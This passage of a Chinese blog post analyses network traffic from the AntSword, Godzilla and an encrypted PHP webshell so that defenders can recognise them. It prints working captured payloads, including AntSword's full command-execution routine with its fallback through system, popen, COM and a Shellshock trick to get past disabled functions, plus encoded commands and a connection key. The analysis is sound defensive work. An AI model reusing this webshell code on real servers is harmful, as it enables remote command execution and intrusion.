class="variable">$fp</span>);    &#125; <span class="keyword">else</span> &#123;        <span class="variable">$kWJW</span> = 0;        <span class="variable">$result</span>[<span class="string">&quot;status&quot;</span>] = base64_encode(<span class="string">&quot;fail&quot;</span>);        <span class="variable">$result</span>[<span class="string">&quot;msg&quot;</span>] = base64_encode(<span class="string">&quot;none of proc_open/passthru/shell_exec/exec/exec is available&quot;</span>);        <span class="variable">$key</span> = <span class="variable">$_SESSION</span>[<span class="string">&#x27;k&#x27;</span>];        <span class="built_in">echo</span> encrypt(json_encode(<span class="variable">$result</span>));        <span class="built_in">return</span>;            &#125;    <span class="variable">$result</span>[<span class="string">&quot;status&quot;</span>] = base64_encode(<span class="string">&quot;success&quot;</span>);    <span class="variable">$result</span>[<span class="string">&quot;msg&quot;</span>] = base64_encode(getSafeStr(<span class="variable">$kWJW</span>));    <span class="built_in">echo</span> encrypt(json_encode(<span class="variable">$result</span>));&#125;<span class="keyword">function</span> Encrypt(<span class="variable">$data</span>)&#123;    <span class="variable">$key</span>=<span class="string">&quot;e45e329feb5d925b&quot;</span>; <span class="keyword">for</span>(<span class="variable">$i</span>=0;<span class="variable">$i</span>&lt;strlen(<span class="variable">$data</span>);<span class="variable">$i</span>++) &#123;    <span class="variable">$data</span>[<span class="variable">$i</span>] = <span class="variable">$data</span>[<span class="variable">$i</span>]^<span class="variable">$key</span>[<span class="variable">$i</span>+1&amp;15];     &#125;    <span class="variable">$bs</span>=<span class="string">&quot;base64_&quot;</span>.<span class="string">&quot;encode&quot;</span>;<span class="variable">$after</span>=<span class="variable">$bs</span>(<span class="variable">$data</span>.<span class="string">&quot;&quot;</span>);    <span class="built_in">return</span> <span class="variable">$after</span>;&#125;<span class="variable">$cmd</span>=<span class="string">&quot;Y2QgL2QgIkM6XHBocFxXV1dcIiZkaXI=&quot;</span>;<span class="variable">$cmd</span>=base64_decode(<span class="variable">$cmd</span>);<span class="variable">$path</span>=<span class="string">&quot;QzovcGhwL1dXVy8=&quot;</span>;<span class="variable">$path</span>=base64_decode(<span class="variable">$path</span>);main(<span class="variable">$cmd</span>,<span class="variable">$path</span>);Gb.<span class="string">&#x27;8)s&gt;w&gt;)#h9g/7unZQ^=r?8#h8n&#x27;</span>`9!:5ds<span class="comment">#ssr#r.|Q_w&#123;s!t`&#123;j!&gt;chi*&#125;p.&#x27;gv?vwpf5k((D|+u(#s~;|uw&#123;wrk&#x27;l&#123;&gt;b8nq/&#123;250t-|r%=z9x/N@t-t`rl] &#x27;&#x27;|&lt;1swrk&#x27;lfw%$tu.&#x27;X]&#123;s!&#123;&#x27;q&#123;ws2tru2us(c:Vq&#123;w!*ekt9.ZQs!&#123;&#x27;q&#123;w!%esr.;w20n5qy|0c&lt;&#x27;+ )!1vk.tNS&#x27;+#/!%rhQ&#x27;q&#123;w|ZzV3&quot;50u2h?&#123;:`&gt;n/#?83wwq:s9rZ,&#x27;|uw d/X%2:dlnj5!kz:Vq&#123;w!i`i3&#x27;2&amp;r&gt;u:5n%t/6unZQs!&#123;&#x27;29hsbstr::+^&gt;48&quot;u&gt;oiX(&lt;:&gt;t-&#123;7x`Zw &#x27;&#x27;x&#x27;2(&amp;m/&#x27;l&#123;6s%a~/unZQs!&#123;&#x27;u6e#Ji&#x27;au2=h`4/&amp;3itf&gt;925t5d%28o$&#x27;.&lt;Q_w&#123;s!2aqsv!2mws%&#125;s2e/M?r~!,&#x27;|uw&#123;s!&#123;#:3un&#x27;:|%%&gt;4^)b!76b2( (ywx.|+q|&#123;&amp;&#123; #W=1#=(`[&#123;w!w &#x27;&#x27;|q:7uiqfwd/pkh80|&amp;w&#x27;u6e#Ji.gX]&#123;s!&#123;&#x27;q&#123;w%acs;wfs`)u0&quot;l6p/ (&#x27;&gt;6t-&#123;#:3un.&lt;Q_w&#123;s!&amp;&#x27;47$dw&#123;|uw&#123;s!&#123;&#x27;u6e#Ji&#x27;au6)!`&quot;/x`Zw &#x27;&#x27;!X]&#123;s!&#123;#2&#123;j!scjcgX]&#123;s!&#123;n7&#123;GLTB|tjfsr/u!4$)$tus398,6ssWN)+&#x27;&#123;&quot;&gt;5t(r&#x27;*V]!w &#x27;&#x27;|uw0!f&#x27;u8w/w&quot;&#x27;5bsf=#`[&#123;w!w&#125;|uw&#123;wK.bIw=&#x27; 5&amp;82m7f372&amp;l&#x27;|uww8bqfw&amp;&gt;nXf.&#x27;6&quot;t:Vq&#123;w!&gt;f&#x27;/x&quot;&gt;EOy|$x$tbj&#123;|w:=e&#123;&amp;qw4e/ /,$/6l|+q`3tMiu|w ^&#123;&#x27;q&#123;w!w he&amp;#:!us.jV]!w &#x27;&#x27;|uw(*r/b&lt;ssb~;|uw&#123;s!&#123;&#x27;u0K :&#x27;37&lt;6ud&gt;5#d9tt/unZQs!&#123;&#x27;q&#123;w!8bXb218?d:iyrl] &#x27;&#x27;|(w&gt;?r&gt;&#x27;8=w)sJrb&#123;&amp;+u&gt;8n&#x27;ei uu657!z&#x27;u!b2( w.:4&lt;q&gt;ivww%acs;~rszVq&#123;w!w &#x27;&#x27;x=657m&gt;&#x27;l&#123;&#x27;s8cXh,09swbw&#x27;0)%`.(|uw&#123;s!&#123;&#x27;q&#123;w!6ruf%&#125;ZQs!&#123;&#x27;q&#123;w!w &#x27;&#x27;|uw&#123;tq2w4|&#123;] &#x27;&#x27;|uw&#123;s!&#123;&#x27;q&#123;w!w&#x27;u Q_w&#123;s!&#123;&#x27;q&#123;w!w .+Q_w&#123;s!&#123;&#x27;q&#123;w!w fu.4.s^&#123;&#x27;q&#123;w!w &#x27;&#x27;|uw&#123;s!|w8+2&amp;&#123;&#x27;|uw&#123;s!&#123;&#x27;q&#123;w!w &#x27; +rZQs!&#123;&#x27;q&#123;w!w &#x27;&#x27;uyZQs!&#123;&#x27;q&#123;w!w &#x27;&#x27;=&#x27;%:*)Vq&#123;w!w &#x27;&#x27;|uw&#123;s!&#123;&#x27;v+&gt;q2&#x27;+Vuw&#123;s!&#123;&#x27;q&#123;w!w &#x27;&#x27;|r |^&#123;&#x27;q&#123;w!w &#x27;&#x27;|u~VY!&#123;&#x27;q&#123;w!w)+&#x27;x%&gt;+6rr&lt;\Qw!w &#x27;&#x27;|us0K&#x27;l&#123;TL&lt;Vuw&#123;s!&#123;&#x27;q,?h;e&#x27;/&#125;u1&gt;&lt;gs#!2&#x27;d$[6Zu|w ^&#123;&#x27;q&#123;w!w &#x27;&#x27;|us0K&#x27;fwg%efctq&#x27;2#d(\`&#123;!f053unZQs!&#123;&#x27;q&#123;w!*&#x27;|uw&#123;s!&#123;G!)8bckh/0;`5c=&gt;~:Z&#x27;&#x27;|u*&#123;6m(bq21!$Mr9)|w0($u?rr uu657!z&#x27;u!b2( w=&amp;$/;s. &#125;&#123;sQ6dsM2|~&#123;(Q&#x27;q&#123;w!w &#x27;h&gt;$/2s//x`Zw &#x27;&#x27;|uw&#123;#`(t%3%t$d.gX]&#123;s!&#123;&#x27;q&#123;w%&lt;WMP|hw41^&lt;b%4n9tbi(&amp;rhQ&#x27;q&#123;w!w &#x27;h&gt;257^8k4:9)~;|uw&#123;.!&gt;k&quot;&gt;wh1 /# 2C/v(?d;lXb$04|z!:i5&#123;v!sBqd9&#125;p(;d7k&gt;/d4&#x27;+&#x27;x6?&#x27;K5.x&#123;,] &#x27;&#x27;|uw&#123;s%0Pw&lt;wsob09&gt;+d8/u8~:Z&#x27;&#x27;|u*&#123;6m(bq21!$Mr9)|b)&gt;4&amp;~ fi8uv&#123;wC-d4spd/ed pus2e/M?r~!,&#x27;|uw&#123;s!&#123;#:Vw=&#x27;f.&#x27;6&quot;&#123;(`[&#123;w!w &#x27;&#x27;|0/&gt;0)d&#125;&#123;sjJP.gX]&#123;s!&#123;&#x27;q&#123;w%&lt;WMP|hw1&lt;h5/23%)f0.+|q&lt;Vr&#x27;&#123;4i%(67unZQs!&#123;&#x27;,&#123;2m$e&#x27;n:ut&gt;V)peb?r~&#123;2o?&#x27;p&#123;sC!cb/&#123;%8+6o|+q`3tMiu|w ^&#123;&#x27;q&#123;w!w #a,uj&#123;#n+b?ssb&#123;  u&#123;|lVY!&#123;&#x27;q&#123;w!w$lPwfsOK`Zw &#x27;&#x27;|uw&#123;:g&#123;/8(s2shr.62swg+.x&#123;,] &#x27;&#x27;|uw&#123;s!&#123;&#x27;q,?h;e&#x27;/&#125;u1&gt;&lt;gs#7+~(w&#123;|uw&#123;s!&#123;&#x27;q&#123;w!w &#x27;&#x27;x&gt;!u:q=%d6d/#:%&#123;&#123;b1i3x`Zw &#x27;&#x27;|uw&#123;s!&#123;&#x27;,V]!w &#x27;&#x27;|uw&amp;^&#123;&#x27;q&#123;w!w Gw?98(6)a!rl] &#x27;&#x27;|(w&gt;?r&gt;&#x27;*V]!w &#x27;&#x27;|uw8VPqfw1l&#x27;|uw&#123;s!&#123;##&gt;$t;t\%/!6/&amp;ryZqfwc6sb1h250n?byy1`&gt;l%.gX]&#123;s!&#123;&#x27;q&#123;w%%etr0!y&gt;r&lt;%&#123;j!5atbja&gt;=b4c4suo8nb&#x27;33w+!n8X&gt;+2oxpft/!?)&amp;.(o47;^2xbds0/&gt;0.&gt;48wh$ fq=&lt;;:1m&gt;%x`Zw &#x27;&#x27;|uw&#123;wj&gt;~qfw%SBT&amp;0 `Zw &#x27;&#x27;|uw&#123;6b3hq&gt;9b%ywst?$4=^&gt;i243d$ub/ ;/z(`[&#123;w!w &#x27;&#x27;|&#x27;2/&amp;s5&lt;\Qw!w &#x27;&#x27;|uZQs!&#123;&#x27;,V]!w &#x27;#.0$.?u%&quot;/6u&quot;s%Z|hw92r&gt;1e2o4ocbtw$.0b&gt;t&quot;y~:Z&#x27;&#x27;|us)6r.k%ul$g%Z|hw92r&gt;1e2o4ocbt22/`=b/%)skPM|~`^&#123;&#x27;q&#123;2b?o&#x27;b26%&quot;#usm&quot;49^2ndh80!d(r=/~(lzQ_ZQYg.i2/&gt;n9 Bi?&#x27;.+&#x27;)c0/6(]&#123;&#x27;|uw8d&quot;:s&gt;c4235&gt;:05n78i23yl!]ah.&#125;s2n1`#8g$u%lbitq3:&#x27;`r&lt;u2|*~ ||uw&#123;Z%?f%:%&gt;]&#x27;:|q3:&#x27;`#8%&lt;e~\x&lt;|ju0nZj&#123;]!w &#x27;zVuw&#123;s%9tly5`$e13wyy6o8h5&gt;u:]#f:!2)n%9ty3`#a)%~|lQs!&#123;&#x27;#&gt;#t%n&#x27;#=3#&gt;!:Qz[4l3=%^n0aP&lt;N:aYBhd-be8N8&lt;`I:%gq467&lt;9f&quot;&gt;a5dbd312swb6cx`sq6to:~-4%bo&amp;feV~?awl#`/ol96r263X80447ds#!:#i~;14&gt;5&#123;%8j5wsq6to.g</span></span><br></pre></td></tr></table></figure>
+
+<p>对$cmd进行base64解码</p>
+<img src="/2024/11/24/Webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/11/24/Webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/1732434811723-8.png" class title="img">
+
+<h1 id="蚁剑"><a href="#蚁剑" class="headerlink" title="蚁剑"></a>蚁剑</h1><p>第一处</p>
+<p>User-Agent: antSword&#x2F;v2.1</p>
+<img src="/2024/11/24/Webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/11/24/Webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/1732434811723-9.png" class title="img">
+
+<p>第二</p>
+<p>命令&#x3D;ini_set display_errors</p>
+<p>cmd&#x3D;%40ini_set(%22display_errors%22%2C%20%220%22)%3B%40set_time_limit(0)</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cmd=@ini_set(<span class="string">&quot;display_errors&quot;</span>, <span class="string">&quot;0&quot;</span>);@set_time_limit(0);<span class="keyword">function</span> asenc(<span class="variable">$out</span>)&#123;<span class="built_in">return</span> <span class="variable">$out</span>;&#125;;<span class="keyword">function</span> <span class="function"><span class="title">asoutput</span></span>()&#123;<span class="variable">$output</span>=ob_get_contents();ob_end_clean();<span class="built_in">echo</span> <span class="string">&quot;07a133296&quot;</span>;<span class="built_in">echo</span> @asenc(<span class="variable">$output</span>);<span class="built_in">echo</span> <span class="string">&quot;773f25c&quot;</span>;&#125;ob_start();try&#123;<span class="variable">$p</span>=base64_decode(<span class="variable">$_POST</span>[<span class="string">&quot;ie3c97aecee867&quot;</span>]);<span class="variable">$s</span>=base64_decode(<span class="variable">$_POST</span>[<span class="string">&quot;d9419dee464d6&quot;</span>]);<span class="variable">$d</span>=<span class="built_in">dirname</span>(<span class="variable">$_SERVER</span>[<span class="string">&quot;SCRIPT_FILENAME&quot;</span>]);<span class="variable">$c</span>=substr(<span class="variable">$d</span>,0,1)==<span class="string">&quot;/&quot;</span>?<span class="string">&quot;-c \&quot;&#123;<span class="variable">$s</span>&#125;\&quot;&quot;</span>:<span class="string">&quot;/c \&quot;&#123;<span class="variable">$s</span>&#125;\&quot;&quot;</span>;<span class="keyword">if</span>(substr(<span class="variable">$d</span>,0,1)==<span class="string">&quot;/&quot;</span>)&#123;@putenv(<span class="string">&quot;PATH=&quot;</span>.getenv(<span class="string">&quot;PATH&quot;</span>).<span class="string">&quot;:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin&quot;</span>);&#125;<span class="keyword">else</span>&#123;@putenv(<span class="string">&quot;PATH=&quot;</span>.getenv(<span class="string">&quot;PATH&quot;</span>).<span class="string">&quot;;C:/Windows/system32;C:/Windows/SysWOW64;C:/Windows;C:/Windows/System32/WindowsPowerShell/v1.0/;&quot;</span>);&#125;<span class="variable">$r</span>=<span class="string">&quot;&#123;<span class="variable">$p</span>&#125; &#123;<span class="variable">$c</span>&#125;&quot;</span>;<span class="keyword">function</span> fe(<span class="variable">$f</span>)&#123;<span class="variable">$d</span>=explode(<span class="string">&quot;,&quot;</span>,@ini_get(<span class="string">&quot;disable_functions&quot;</span>));<span class="keyword">if</span>(empty(<span class="variable">$d</span>))&#123;<span class="variable">$d</span>=array();&#125;<span class="keyword">else</span>&#123;<span class="variable">$d</span>=array_map(<span class="string">&#x27;trim&#x27;</span>,array_map(<span class="string">&#x27;strtolower&#x27;</span>,<span class="variable">$d</span>));&#125;<span class="built_in">return</span>(function_exists(<span class="variable">$f</span>)&amp;&amp;is_callable(<span class="variable">$f</span>)&amp;&amp;!in_array(<span class="variable">$f</span>,<span class="variable">$d</span>));&#125;;<span class="keyword">function</span> runshellshock(<span class="variable">$d</span>, <span class="variable">$c</span>) &#123;<span class="keyword">if</span> (substr(<span class="variable">$d</span>, 0, 1) == <span class="string">&quot;/&quot;</span> &amp;&amp; fe(<span class="string">&#x27;putenv&#x27;</span>) &amp;&amp; (fe(<span class="string">&#x27;error_log&#x27;</span>) || fe(<span class="string">&#x27;mail&#x27;</span>))) &#123;<span class="keyword">if</span> (strstr(<span class="built_in">readlink</span>(<span class="string">&quot;/bin/sh&quot;</span>), <span class="string">&quot;bash&quot;</span>) != FALSE) &#123;<span class="variable">$tmp</span> = tempnam(sys_get_temp_dir(), <span class="string">&#x27;as&#x27;</span>);putenv(<span class="string">&quot;PHP_LOL=() &#123; x; &#125;; <span class="variable">$c</span> &gt;<span class="variable">$tmp</span> 2&gt;&amp;1&quot;</span>);<span class="keyword">if</span> (fe(<span class="string">&#x27;error_log&#x27;</span>)) &#123;error_log(<span class="string">&quot;a&quot;</span>, 1);&#125; <span class="keyword">else</span> &#123;mail(<span class="string">&quot;a@127.0.0.1&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;-bv&quot;</span>);&#125;&#125; <span class="keyword">else</span> &#123;<span class="built_in">return</span> False;&#125;<span class="variable">$output</span> = @file_get_contents(<span class="variable">$tmp</span>);@<span class="built_in">unlink</span>(<span class="variable">$tmp</span>);<span class="keyword">if</span> (<span class="variable">$output</span> != <span class="string">&quot;&quot;</span>) &#123;<span class="built_in">print</span>(<span class="variable">$output</span>);<span class="built_in">return</span> True;&#125;&#125;<span class="built_in">return</span> False;&#125;;<span class="keyword">function</span> runcmd(<span class="variable">$c</span>)&#123;<span class="variable">$ret</span>=0;<span class="variable">$d</span>=<span class="built_in">dirname</span>(<span class="variable">$_SERVER</span>[<span class="string">&quot;SCRIPT_FILENAME&quot;</span>]);<span class="keyword">if</span>(fe(<span class="string">&#x27;system&#x27;</span>))&#123;@system(<span class="variable">$c</span>,<span class="variable">$ret</span>);&#125;elseif(fe(<span class="string">&#x27;passthru&#x27;</span>))&#123;@passthru(<span class="variable">$c</span>,<span class="variable">$ret</span>);&#125;elseif(fe(<span class="string">&#x27;shell_exec&#x27;</span>))&#123;<span class="built_in">print</span>(@shell_exec(<span class="variable">$c</span>));&#125;elseif(fe(<span class="string">&#x27;exec&#x27;</span>))&#123;@<span class="built_in">exec</span>(<span class="variable">$c</span>,<span class="variable">$o</span>,<span class="variable">$ret</span>);<span class="built_in">print</span>(<span class="built_in">join</span>(<span class="string">&quot;</span></span><br><span class="line"><span class="string">&quot;</span>,<span class="variable">$o</span>));&#125;elseif(fe(<span class="string">&#x27;popen&#x27;</span>))&#123;<span class="variable">$fp</span>=@popen(<span class="variable">$c</span>,<span class="string">&#x27;r&#x27;</span>);<span class="keyword">while</span>(!@feof(<span class="variable">$fp</span>))&#123;<span class="built_in">print</span>(@fgets(<span class="variable">$fp</span>,2048));&#125;@pclose(<span class="variable">$fp</span>);&#125;elseif(fe(<span class="string">&#x27;proc_open&#x27;</span>))&#123;<span class="variable">$p</span> = @proc_open(<span class="variable">$c</span>, array(1 =&gt; array(<span class="string">&#x27;pipe&#x27;</span>, <span class="string">&#x27;w&#x27;</span>), 2 =&gt; array(<span class="string">&#x27;pipe&#x27;</span>, <span class="string">&#x27;w&#x27;</span>)), <span class="variable">$io</span>);<span class="keyword">while</span>(!@feof(<span class="variable">$io</span>[1]))&#123;<span class="built_in">print</span>(@fgets(<span class="variable">$io</span>[1],2048));&#125;<span class="keyword">while</span>(!@feof(<span class="variable">$io</span>[2]))&#123;<span class="built_in">print</span>(@fgets(<span class="variable">$io</span>[2],2048));&#125;@fclose(<span class="variable">$io</span>[1]);@fclose(<span class="variable">$io</span>[2]);@proc_close(<span class="variable">$p</span>);&#125;elseif(fe(<span class="string">&#x27;antsystem&#x27;</span>))&#123;@antsystem(<span class="variable">$c</span>);&#125;elseif(runshellshock(<span class="variable">$d</span>, <span class="variable">$c</span>)) &#123;<span class="built_in">return</span> <span class="variable">$ret</span>;&#125;elseif(substr(<span class="variable">$d</span>,0,1)!=<span class="string">&quot;/&quot;</span> &amp;&amp; @class_exists(<span class="string">&quot;COM&quot;</span>))&#123;<span class="variable">$w</span>=new COM(<span class="string">&#x27;WScript.shell&#x27;</span>);<span class="variable">$e</span>=<span class="variable">$w</span>-&gt;<span class="built_in">exec</span>(<span class="variable">$c</span>);<span class="variable">$so</span>=<span class="variable">$e</span>-&gt;StdOut();<span class="variable">$ret</span>.=<span class="variable">$so</span>-&gt;ReadAll();<span class="variable">$se</span>=<span class="variable">$e</span>-&gt;StdErr();<span class="variable">$ret</span>.=<span class="variable">$se</span>-&gt;ReadAll();<span class="built_in">print</span>(<span class="variable">$ret</span>);&#125;<span class="keyword">else</span>&#123;<span class="variable">$ret</span> = 127;&#125;<span class="built_in">return</span> <span class="variable">$ret</span>;&#125;;<span class="variable">$ret</span>=@runcmd(<span class="variable">$r</span>.<span class="string">&quot; 2&gt;&amp;1&quot;</span>);<span class="built_in">print</span> (<span class="variable">$ret</span>!=0)?<span class="string">&quot;ret=&#123;<span class="variable">$ret</span>&#125;&quot;</span>:<span class="string">&quot;&quot;</span>;;&#125;catch(Exception <span class="variable">$e</span>)&#123;<span class="built_in">echo</span> <span class="string">&quot;ERROR://&quot;</span>.<span class="variable">$e</span>-&gt;getMessage();&#125;;asoutput();die();&amp;d9419dee464d6=Y2QgL2QgIkM6XFxwaHBcXFdXVyImd2hvYW1pJmVjaG8gW1NdJmNkJmVjaG8gW0Vd&amp;ie3c97aecee867=Y21k</span><br></pre></td></tr></table></figure>
+
+<p>第三</p>
+<p>随机位数</p>
+<p>例如这里在受害主机是Windows环境</p>
+<p>我们执行了whoami命令</p>
+<p>响应包的数据会出现 随机数+结果+随机数</p>
+<img src="/2024/11/24/Webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/11/24/Webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/1732434811723-10.png" class title="img">
+
+<h3 id="分析攻击命令部分"><a href="#分析攻击命令部分" class="headerlink" title="分析攻击命令部分"></a>分析攻击命令部分</h3><p>进行url解码找到die()函数后面</p>
+<img src="/2024/11/24/Webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/11/24/Webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/1732434811723-11.png" class title="img">
+
+<p>由于蚁剑设置时会有随机字符混淆</p>
+<img src="/2024/11/24/Webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/11/24/Webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/1732434811723-12.png" class title="img">
+
+<p>默认长度为2</p>
+<p>解密时需去掉前面2个字符</p>
+<img src="/2024/11/24/Webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/11/24/Webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/1732434811723-13.png" class title="img">
+
+<img src="/2024/11/24/Webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/11/24/Webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/1732434811723-14.png" class title="img">
+
+<p>base64编码</p>
+<p>很明显的流量特征 命令参数&#x3D;eval</p>
+<img src="/2024/11/24/Webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/11/24/Webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/1732434811723-15.png" class title="img">
+
+<img src="/2024/11/24/Webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/11/24/Webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/1732434811724-16.png" class title="img">
+
+<img src="/2024/11/24/Webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/11/24/Webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/1732434811724-17.png" class title="img">
+
+<h1 id="哥斯拉"><a href="#哥斯拉" class="headerlink" title="哥斯拉"></a>哥斯拉</h1><img src="/2024/11/24/Webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/11/24/Webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/1732434811724-18.png" class title="img">
+
+<p>判断哥斯拉方法</p>
+<p>第一次请求是没有cookie的 请求体上传大量数据</p>
+<p>这一段数据为固定代码（payload）</p>
+<img src="/2024/11/24/Webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/11/24/Webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/1732434811724-19.png" class title="img">
+
+<p>第一次http响应为空 但是传回了cookie 即 Set-Cookie: PHPSESSID&#x3D;3vghm6s0r2d69h0ooetsa70077;</p>
+<img src="/2024/11/24/Webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/11/24/Webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/1732434811724-20.png" class title="img">
+
+<p>第二次请求</p>
+<img src="/2024/11/24/Webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/11/24/Webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/1732434811724-21.png" class title="img">
+
+<p>第二次请求发送一段固定代码（test），执行结果为固定内容</p>
+<p>请求的内容解码后为 methodName test</p>
+<img src="/2024/11/24/Webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/11/24/Webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/1732434811724-22.png" class title="img">
+
+<p>相应包解码后为ok</p>
+<img src="/2024/11/24/Webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/11/24/Webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/1732434811724-23.png" class title="img">
+
+<p>第三次请求发送内容解码后</p>
+<p>methodName  getBasicsInfo</p>
+<img src="/2024/11/24/Webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/11/24/Webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/1732434811724-24.png" class title="img">
+
+<p>响应包为一些主机信息</p>
+<img src="/2024/11/24/Webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/11/24/Webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/1732434811724-25.png" class title="img">
+
+<p>一个强特征</p>
+<p>cookie以分号;结尾</p>
+<img src="/2024/11/24/Webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/11/24/Webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/1732434811724-26.png" class title="img">
+
+<p>流量解码</p>
+<p>先查看webshell文件获取密钥</p>
+<p> post 请求主体为连接密码例如这里是pass</p>
+<img src="/2024/11/24/Webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/11/24/Webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/1732434811724-27.png" class title="img">
+
+<p>密码为cmd密钥为fe01ce2a7fbac8fa</p>
+<img src="/2024/11/24/Webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/11/24/Webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/1732434811724-28.png" class title="img">
+
+<img src="/2024/11/24/Webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/11/24/Webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/1732434811725-29.png" class title="img">
+
+<h1 id="webshell快速定位"><a href="#webshell快速定位" class="headerlink" title="webshell快速定位"></a>webshell快速定位</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http contains <span class="string">&quot;php&quot;</span></span><br></pre></td></tr></table></figure>
+
+<img src="/2024/11/24/Webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/11/24/Webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/1732434811725-30.png" class title="img">
+
+<p>这里发现通过一个文件上传上传了哥斯拉webshell</p>
+<p>发现了连接密码为cmd以及密钥key为fe01ce2a7fbac8fa </p>
+<img src="/2024/11/24/Webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/11/24/Webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/1732434811725-31.png" class title="img">
+
+<img src="/2024/11/24/Webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/11/24/Webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/1732434811725-32.png" class title="img">
+
+<img src="/2024/11/24/Webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/11/24/Webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/1732434811725-33.png" class title="img">
+
+<p>亦或者搜索关键字webshell的密钥key</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http contains <span class="string">&quot;key&quot;</span></span><br></pre></td></tr></table></figure>
+
+<img src="/2024/11/24/Webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/11/24/Webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/1732434811725-34.png" class title="img">
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="https://qingannn.github.io">轻安</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://qingannn.github.io/2024/11/24/Webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/">https://qingannn.github.io/2024/11/24/Webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://qingannn.github.io" target="_blank">轻安のblog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/hvv/">hvv</a><a class="post-meta__tags" href="/tags/%E6%B5%81%E9%87%8F%E7%89%B9%E5%BE%81%EF%BC%8CWebshell%EF%BC%8C%E7%A0%94%E5%88%A4/">流量特征，Webshell，研判</a></div><div class="post_share"><div class="social-share" data-image="https://s2.loli.net/2024/11/24/hnSfdGNKxzFWvuo.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/2024/11/24/CS%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/" title="CS流量分析"><img class="cover" src="https://s2.loli.net/2024/11/24/c2dVi6q8tWxrHyu.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">CS流量分析</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a 